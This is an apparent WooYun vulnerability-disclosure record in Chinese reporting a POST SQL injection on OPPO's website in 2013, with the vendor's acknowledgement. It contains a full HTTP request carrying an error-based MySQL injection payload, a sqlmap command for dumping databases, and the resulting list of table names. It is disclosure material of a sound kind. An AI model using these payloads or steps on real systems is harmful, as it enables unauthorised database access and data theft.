{"id": 11130, "wybug_id": "wooyun-2013-025853", "wybug_title": "OPPO主站SQL注入漏洞", "wybug_corp": "广东欧珀移动通讯有限公司", "wybug_author": "海绵宝宝", "wybug_date": "2013-06-13 15:34", "wybug_open_date": "2013-07-28 15:34", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧", "注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-28：\t细节向公众公开  简要描述： 有人发过主站的注入，那个是get型注入，已经补了。但是补的不全,这个是POST型注入 详细说明：  \nhttp://www.oppo.com\n  主站网址利用WVS扫出来有注入点的\n\n虽然存在，但是POST不好利用在/index.php下，name参赛和url参赛存在post型注入，但我在index.php中并未找到这两个参数利用 WVS返回的结果仍然可以利用\nPOST /index.php?q=index/stat HTTP/1.1Content-Length: 441Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=g7h14l8bajs4pepa2s7v6kjj75; visit=1; model=U701; CNZZDATA1309239=cnzz_eid%3D261854732-1371103504-http%253A%252F%252Fwww.oppo.com%26ntime%3D1371103504%26cnzz_a%3D0%26retime%3D1371103506709%26sin%3Djavascript%253AUPN9r7l8nQoPETLv()%253C%253E%26ltime%3D1371103506709%26rtime%3D0Host: www.oppo.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Accept: */*name=%27and%28select%201%20from%28select%20count%28*%29%2cconcat%28%28select%20concat%28CHAR%2852%29%2cCHAR%2867%29%2cCHAR%28117%29%2cCHAR%2897%29%2cCHAR%28112%29%2cCHAR%2873%29%2cCHAR%2883%29%2cCHAR%2848%29%2cCHAR%28121%29%2cCHAR%2874%29%2cCHAR%2890%29%29%20from%20information_schema.tables%20limit%200%2c1%29%2cfloor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29and%27&url=http%3A%2F%2Ftheme.oppo.com%2F\n这段数据包是由WVS自己提交的，虽然我未找到name和url参数将这段post请求保存为txt格式，放在sqlmap目录下利用sqlmap，\n.\\sqlmap.py -r 2.txt -p name --dbs\n这段命令，即可继续注入参数url同理.   漏洞证明：  \n\n\n\n\nDatabase: oppo_www[45 tables]+------------------------------+| HrefStat                     || Tetris                       || attachment                   || ipfilter                     || ipfilterall                  || mobilenet_attachment         || oppo_aggragation             || oppo_android_heat            || oppo_apk_downloads           || oppo_article                 || oppo_article_comment         || oppo_article_content         || oppo_assistant_feedback      || oppo_category                || oppo_ebook                   || oppo_editor_link             || oppo_editor_link_class       || oppo_globalfocus             || oppo_mobile                  || oppo_mobile_activation       || oppo_mobile_faq              || oppo_mobile_faq_category     || oppo_mobile_music            || oppo_mobile_music_category   || oppo_mobile_theme            || oppo_mobilenet               || oppo_mobilenet_news          || oppo_mp3                     || oppo_nearmeapk               || oppo_page                    || oppo_serviceqq               || oppo_softapk                 || oppo_softbeta                || oppo_softimage               || oppo_software                || oppo_stat                    || oppo_threadlist_record       || rom_updatelog                || search_record                || service_support_faq          || service_support_network      || service_support_opposhop     || service_support_opposhop_pic || ticket                       || ticketcode                   |+------------------------------+\n   修复方案：  虽然get注入已经补了，但过滤不严造成post注入依旧存在   版权声明：转载请注明来源 海绵宝宝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-06-14 15:51 厂商回复： 感谢帮忙找出问题，已经提交给官网维护人员评估修改 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-14 11:02 |    \t\t海绵宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:50        | 唯有梦想与好姑娘不可辜负.)\t\t \n  求礼物，我还有洞发    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}